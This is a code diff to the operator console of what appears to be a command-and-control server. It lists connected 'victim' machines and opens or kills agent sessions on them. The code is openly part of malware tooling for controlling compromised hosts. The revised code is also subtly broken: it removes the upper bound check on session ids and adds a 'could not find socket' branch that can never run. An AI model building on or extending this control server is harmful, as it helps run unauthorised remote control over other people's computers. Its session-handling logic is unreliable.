@@ -28,19 +28,18 @@ int server_control_session(){
             printf("\nID          Address\n--------------------------\n");
             for (int i = 0; i < max_clients; i++){
                 if (client_socket[i] == 0){ continue; }  // Continue just in case there is a random NULL socket
-                printf("%d           %s\n", i + 1, get_socket_addr(client_socket[i]));
+                printf("%-12d%s\n", i + 1, get_socket_addr(client_socket[i]));
             }
 	    printf("\n");
         } else if (str_starts_with(buffer, "use") == 0) {
             selected_id = 0;
 
-            for (int c = 4; c < strlen(buffer); c++){
-                if (isdigit(buffer[c])) {
-                    selected_id += ((int) buffer[c] - 48) * (strlen(buffer) - 5);  // TODO FIX THIS MESS PLEASE
-                }
-            }
+	    char* value = split(buffer, " ");
+	    int selected_value = atoi(value);
 
-            if (selected_id > victim_count || selected_id < 0) {
+            selected_id += selected_value;
+                
+            if (selected_id < 0) {
                 printf("Invalid id!\n\n");
             } else {
                 printf("[+] Entering agent control session with session ID: %d...\n", selected_id);
@@ -48,29 +47,34 @@ int server_control_session(){
                 selected_id += 3;
                 return selected_id;
             }
-        } else if (str_starts_with(buffer, "kill") == 0){
+    	}
+        else if (str_starts_with(buffer, "kill") == 0){
 		
 		selected_id = 0;
 
-		for(int c = 5; c < strlen(buffer); c++){
-			if (isdigit(buffer[c])){
-				selected_id += ((int) buffer[c] - 48) * (strlen(buffer) - 6);
-			}
-		}
+	    	char* value = split(buffer, " ");
+		int selected_value = atoi(value);
+		
+		selected_id += selected_value;
 
-		if (selected_id > victim_count || selected_id < 0){
+		if (selected_id < 0){
 			printf("Invalid id!\n\n");
 		} else{
 			printf("[+] Killing agent control session with session ID: %d...\n", selected_id);
 			selected_id += 3;
-			victim_count--;
 			for(int i = 0; i < max_clients; i++){
 				if(client_socket[i] == selected_id){
+					close(client_socket[i]);
+
+					victim_count--;
 					client_socket[i] = 0;
+					printf("[+] Control session: %d successfully killed.\n", selected_id - 3);
+				}
+				
+				else if(i == max_clients){
+					printf("[-] Could not find socket to kill.\n");
 				}
 			}
-			close(selected_id);
-			printf("[+] Control session: %d successfully killed.\n", selected_id -= 3);
 		}
 
 
